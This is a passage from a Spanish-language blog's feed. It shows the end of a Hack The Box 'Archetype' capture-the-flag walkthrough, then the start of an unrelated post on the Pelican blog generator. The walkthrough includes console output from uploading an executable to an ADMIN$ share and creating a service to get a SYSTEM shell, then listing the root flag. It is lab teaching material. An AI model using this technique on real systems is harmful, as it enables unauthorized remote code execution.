+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Requesting shares on &lt;span class="m"&gt;10&lt;/span&gt;.10.10.27.....
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Found writable share ADMIN$
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Uploading file jcWXyjRG.exe
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Opening SVCManager on &lt;span class="m"&gt;10&lt;/span&gt;.10.10.27.....
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Creating service UFMW on &lt;span class="m"&gt;10&lt;/span&gt;.10.10.27.....
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Starting service UFMW.....
+&lt;span class="o"&gt;[&lt;/span&gt;!&lt;span class="o"&gt;]&lt;/span&gt; Press &lt;span class="nb"&gt;help&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; extra shell commands
+Microsoft Windows &lt;span class="o"&gt;[&lt;/span&gt;Version &lt;span class="m"&gt;10&lt;/span&gt;.0.17763.107&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;span class="o"&gt;(&lt;/span&gt;c&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;2018&lt;/span&gt; Microsoft Corporation. All rights reserved.
+
+C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem32&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Verificamos nuestros&amp;nbsp;permisos:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem32&amp;gt;whoami
+nt authority&lt;span class="se"&gt;\s&lt;/span&gt;ystem
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;En efecto, tenemso permisos de administrador, y ahora podemos ir al escritorio
+del administrador y extraer la última&amp;nbsp;bandera.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem32&amp;gt;cd C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;dministrator&lt;span class="se"&gt;\D&lt;/span&gt;esktop
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;dministrator&lt;span class="se"&gt;\D&lt;/span&gt;esktop&amp;gt;dir
+ Volume in drive C has no label.
+ Volume Serial Number is CE13-2325
+
+ Directory of C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;dministrator&lt;span class="se"&gt;\D&lt;/span&gt;esktop
+
+&lt;span class="m"&gt;01&lt;/span&gt;/20/2020  &lt;span class="m"&gt;05&lt;/span&gt;:42 AM    &amp;lt;DIR&amp;gt;          .
+&lt;span class="m"&gt;01&lt;/span&gt;/20/2020  &lt;span class="m"&gt;05&lt;/span&gt;:42 AM    &amp;lt;DIR&amp;gt;          ..
+&lt;span class="m"&gt;02&lt;/span&gt;/25/2020  &lt;span class="m"&gt;06&lt;/span&gt;:36 AM                &lt;span class="m"&gt;32&lt;/span&gt; root.txt
+               &lt;span class="m"&gt;1&lt;/span&gt; File&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;             &lt;span class="m"&gt;32&lt;/span&gt; bytes
+               &lt;span class="m"&gt;2&lt;/span&gt; Dir&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;  &lt;span class="m"&gt;33&lt;/span&gt;,818,599,424 bytes free
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;dministrator&lt;span class="se"&gt;\D&lt;/span&gt;esktop&amp;gt;type root.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Listo! Tenemos las dos banderas de esta&amp;nbsp;máquina!&lt;/p&gt;
+&lt;h2&gt;Fin&lt;/h2&gt;
+&lt;p&gt;Bueno, con eso hemos concluido la revisión del primer walk-through de las
+máquinas de introducción de &lt;code&gt;HTB&lt;/code&gt;. Este texto fue un poco más extenso ya que se
+fueron expllicando paso a paso cada comando, pero conforme avancemos en las
+herramientas y comandos obviaremos los que se hayan explicado&amp;nbsp;previamente.&lt;/p&gt;
+&lt;p&gt;Espero haya sido de tu agrado y utilidad este texto, y si vas comenzando en
+estos temas de seguridad, &lt;a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ"&gt;recuerda no rendirte&lt;/a&gt;
+y seguir aprendiendo poco a&amp;nbsp;poco.&lt;/p&gt;
+&lt;p&gt;Nos vemos en el siguiente texto.&amp;nbsp;Ciao!&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;#HappyHacking&lt;/code&gt;&lt;/p&gt;</content><category term="htb"></category><category term="blog"></category><category term="penserbjorne"></category><category term="htb"></category><category term="pentest"></category><category term="hacking"></category><category term="archetype"></category></entry><entry><title>Pelican (02), creación de entradas para un blog estático con Pelican</title><link href="https://penserbjorne.com/pelican-02-creacion-de-entradas-para-un-blog-estatico-con-pelican-es-MX.html" rel="alternate"></link><published>2020-05-09T00:00:00-05:00</published><updated>2020-08-20T00:00:00-05:00</updated><author><name>Penserbjorne</name></author><id>tag:penserbjorne.com,2020-05-09:/pelican-02-creacion-de-entradas-para-un-blog-estatico-con-pelican-es-MX.html</id><summary type="html">&lt;p&gt;Creación de entradas para un blog estático con&amp;nbsp;Pelican&lt;/p&gt;</summary><content type="html">&lt;h1&gt;What is&amp;nbsp;this?&lt;/h1&gt;
 &lt;p&gt;Weno weno, ¿de que va esta entrada? Pues de cómo escribir contenido (entradas)
 en el blog con &lt;code&gt;Pelican&lt;/code&gt;. Esto es continuación de la
